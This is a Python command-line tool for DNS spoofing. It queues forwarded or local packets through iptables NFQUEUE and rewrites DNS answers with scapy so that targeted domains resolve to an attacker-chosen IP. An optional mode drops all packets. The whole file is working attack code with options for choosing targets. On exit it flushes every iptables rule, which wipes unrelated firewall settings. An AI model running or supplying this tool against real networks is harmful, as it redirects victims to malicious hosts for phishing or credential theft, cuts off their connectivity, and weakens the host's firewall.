#!/usr/bin/python3

try:
    print("[>] Importing required modules")
    import subprocess
    from netfilterqueue import NetfilterQueue
    import scapy.all as scapy
    import argparse
except ModuleNotFoundError:
    print("[!] Missing modules, Exiting...")
    exit()
else:
    print("[>] Modules successfully imported")
    print() # Just a line break

########################################################################
# User Defined Function
########################################################################

def nothing():
    
    """This function does nothing ;)"""
    
    pass

def get_arguments():

    """This function will get arguments from the command line"""

    parser = argparse.ArgumentParser(description="All arguments are optional")
    parser.add_argument("-io","--inout",help="This argument will order the program to capture and process packets from INPUT and OUTPUT chain (Packets of your computer) rather than FORWARD chain",dest='io',action='store_true')
    parser.add_argument("-b","--block",help="Packets will not be forwarded or accepted, they will be blocked (No Internet)",dest='block',action='store_true')
    parser.add_argument("-td","--target-dns",help="DNS response to target for spoofing, target every address if not provided",dest='target_dns')
    parser.add_argument("-si","--spoof-ip",help="IP that would be spoofed with target-dns response",dest='spoof_ip')
    parser.add_argument("-s","--silent",help="Show less output",dest="mute",action="store_true")
    options = parser.parse_args()

    return (options.io, options.block, options.target_dns, options.spoof_ip, options.mute)

def is_root():

    """This function will return a boolean value based on whether the program was run as root or not"""

    current_user_id = int(subprocess.check_output(["id","-u"]))
    if current_user_id == 0:
        return True
    else:
        return False

def callback_function(packet):

    """This function will be called on every packet in the queue, it will manipulate the packets and accept or block as adviced"""

    # If the packet has to be accepted
    if not block:
        # Converting the packet into scapy packet for manipulation
        scapy_packet = scapy.IP(packet.get_payload())
        
        # If the packet has DNS response layer
        if scapy_packet.haslayer(scapy.DNSRR):
            # Get the DNS query URL
            qname = scapy_packet[scapy.DNS].qd.qname
            # Checking if target-dns resembles the query URL and the response has the response data
            if target_dns in str(qname) and scapy_packet[scapy.DNS].an.rdata:
                # Crafting custom spoof packet
                spoofed_answer = scapy.DNSRR(rrname=qname,rdata=spoof_ip)
                # Merging the custom spoof packet
                scapy_packet[scapy.DNS].an = spoofed_answer
                
                # Further modifying the packet (Reducing the answer count and deleting the checksum layers)
                scapy_packet[scapy.DNS].ancount = 1
                try:
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.UDP].chksum
                    del scapy_packet[scapy.UDP].len
                except:
                    nothing()
                # Replacing the modified packet with original packet
                if mute:
                    print("[+] Spoofing IP")
                else:
                    query = (str(qname))[2:-1]
                    print(f"[+] Spoofing DNS Response of {query} with {spoof_ip}")
                packet.set_payload(bytes(scapy_packet))
        # Sending the modified packet
        packet.accept()
    # Else if packet has to be blocked
    else:
        packet.drop()
        print("[+] Packet dropped")

########################################################################
# The main function
########################################################################

# Getting arguments
(input_output_chain, block, target_dns, spoof_ip, mute) = get_arguments()

# Checking for privileges
if is_root():
    nothing()
else:
    print("[!] Please run the script as root")
    exit()

# Processing the arguments
if target_dns:
    nothing()
else:
    print("[-] Target DNS not provided, targetting all DNS responses") if not mute else nothing()
    target_dns = ""

if spoof_ip:
    nothing()
else:
    print("[-] Spoof IP not provided, inputting manually") if not mute else nothing()
    print() if not mute else nothing()
    spoof_ip = input("[?] Enter the spoof IP (Where all targetted DNS responses will be redirected) : ")

# Feedback
print(f"[>] Target DNS is set to {target_dns}") if not mute else nothing()
print(f"[>] Spoof IP is set to {spoof_ip}") if not mute else nothing()

# Creating a queue
print() if not mute else nothing()
print("[+] Creating a queue") if not mute else nothing()

# Check which queue to create based on chain
if input_output_chain:
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
else:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)

# Binding NetfilterQueue with the created queue
queue = NetfilterQueue()
queue.bind(0,callback_function)
print("[+] Queue created and binded") if not mute else nothing()
print() if not mute else nothing() 

# Starting to analyze the queue
try:
    queue.run()
except KeyboardInterrupt:
    print('')

# Flushing the ip tables and exiting
print("[+] Flushing iptables")
queue.unbind()
subprocess.call("iptables --flush",shell=True)